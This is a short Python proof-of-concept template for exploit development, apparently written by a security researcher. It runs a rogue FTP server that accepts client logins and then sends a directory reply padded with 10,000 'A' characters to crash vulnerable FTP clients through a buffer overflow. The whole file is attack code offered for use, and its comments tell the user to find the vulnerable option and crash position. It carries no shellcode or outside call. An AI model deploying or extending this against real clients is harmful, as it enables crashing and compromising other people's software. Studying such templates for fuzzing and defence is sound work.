#!/usr/bin/python
''' 
Content:	exploitDev PoC template for ftp_listining targets
Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
Date: 		02/2018
	
Usage:		python ftp_listen.py localPort
Note:		This is just a generic template, you have to find the vulnerable option by yourself and change the position of crash
		
'''
import socket
import sys

if len(sys.argv) != 2:
	print "Usage: ftp_listen.py localPort"
else:
	port = int(sys.argv[1])

	try:
        	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        	s.bind(("0.0.0.0", port))
        	s.listen(5)
        	print("[i] FTP server started on port: "+str(port)+"\r\n")
	except:
        	print("[!] Failed to bind the server to port: "+str(port)+"\r\n")




	buffer = "A"*10000
	while True:
    		conn, addr = s.accept()
    		conn.send('220 Welcome to your bad FTP server by @HanseSecure\r\n')
    		print(conn.recv(1024))
    		conn.send("331 OK\r\n")
    		print(conn.recv(1024))
    		conn.send('230 OK\r\n')
    		print(conn.recv(1024))
    		conn.send('220 "'+buffer+'" is current directory\r\n')
